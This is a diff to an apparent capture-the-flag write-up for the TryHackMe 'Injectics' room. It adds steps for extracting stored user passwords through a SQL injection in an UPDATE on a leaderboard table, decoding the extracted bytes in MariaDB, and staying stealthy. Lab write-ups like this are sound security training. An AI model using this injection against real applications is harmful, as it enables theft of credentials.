@@ -71,6 +71,20 @@ UPDATE leaderbord set gold   = ascii(mid((select+group_concat(password)+from+use
 where rank=1;
 ```
 
-With some patience we can recover the initial passwords and login without having to drop the users table. or changing the current password, thus being more stealthy!
+Or 18 characters at a time with six calls to` edit_leaderboard.php`:
+
+![[Screenshot 2024-07-29 alle 11.15.08.png]]
+
+```
+MariaDB [(none)]> select char(50,51,52,50,115,100,115,102,119,102,50,119,114,50,114,102,44,51);
++-----------------------------------------------------------------------+
+| char(50,51,52,50,115,100,115,102,119,102,50,119,114,50,114,102,44,51) |
++-----------------------------------------------------------------------+
+| 2342sdsfwf2wr2rf,3                                                    |
++-----------------------------------------------------------------------+
+```
+
+Password for superadmin is left as an exercise to the reader.
+With some patience we can recover the initial passwords and login without having to drop the users table, or changing the current password, thus being more stealthy!
 
 Go here https://tryhackme.com/r/room/injectics to play the room! 
